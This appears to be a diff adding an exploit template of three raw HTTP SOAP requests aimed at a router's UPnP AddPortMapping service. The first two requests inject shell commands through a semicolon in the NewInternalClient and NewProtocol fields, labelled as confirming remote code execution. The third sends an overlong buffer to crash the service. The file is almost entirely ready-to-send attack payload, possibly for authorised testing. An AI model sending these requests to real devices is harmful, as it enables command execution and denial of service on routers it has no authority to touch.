@@ -1,0 +1,66 @@
+[Step 1] NewInternalClient 分号注入（RCE 确认）
+POST /upnp/control/WANIPConn1 HTTP/1.1
+Host: {{target}}
+SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+Content-Type: text/xml
+Content-Length: 637
+
+<?xml version="1.0"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<s:Body>
+<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
+<NewRemoteHost></NewRemoteHost>
+<NewExternalPort>8899</NewExternalPort>
+<NewProtocol>TCP</NewProtocol>
+<NewInternalPort>8899</NewInternalPort>
+<NewInternalClient>192.168.10.100;/bin/echo UPNP_INJECT_OK >/tmp/upnpwn;</NewInternalClient>
+<NewEnabled>1</NewEnabled>
+<NewPortMappingDescription>test</NewPortMappingDescription>
+<NewLeaseDuration>0</NewLeaseDuration>
+</u:AddPortMapping>
+</s:Body>
+</s:Envelope>
+[Step 2] NewProtocol 分号注入（变体）
+POST /upnp/control/WANIPConn1 HTTP/1.1
+Host: {{target}}
+SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+Content-Type: text/xml
+Content-Length: 643
+
+<?xml version="1.0"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<s:Body>
+<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
+<NewRemoteHost></NewRemoteHost>
+<NewExternalPort>8898</NewExternalPort>
+<NewProtocol>TCP;/bin/echo UPNP_PROTO_INJECT >/tmp/upnpproto;</NewProtocol>
+<NewInternalPort>8898</NewInternalPort>
+<NewInternalClient>192.168.10.100</NewInternalClient>
+<NewEnabled>1</NewEnabled>
+<NewPortMappingDescription>test</NewPortMappingDescription>
+<NewLeaseDuration>0</NewLeaseDuration>
+</u:AddPortMapping>
+</s:Body>
+</s:Envelope>
+[Step 3] NewInternalClient 超长溢出（DoS）
+POST /upnp/control/WANIPConn1 HTTP/1.1
+Host: {{target}}
+SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+Content-Type: text/xml
+Content-Length: 1184
+
+<?xml version="1.0"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<s:Body>
+<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
+<NewRemoteHost></NewRemoteHost>
+<NewExternalPort>8899</NewExternalPort>
+<NewProtocol>TCP</NewProtocol>
+<NewInternalPort>8899</NewInternalPort>
+<NewInternalClient>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</NewInternalClient>
+<NewEnabled>1</NewEnabled>
+<NewPortMappingDescription>test</NewPortMappingDescription>
+<NewLeaseDuration>0</NewLeaseDuration>
+</u:AddPortMapping>
+</s:Body>
+</s:Envelope>
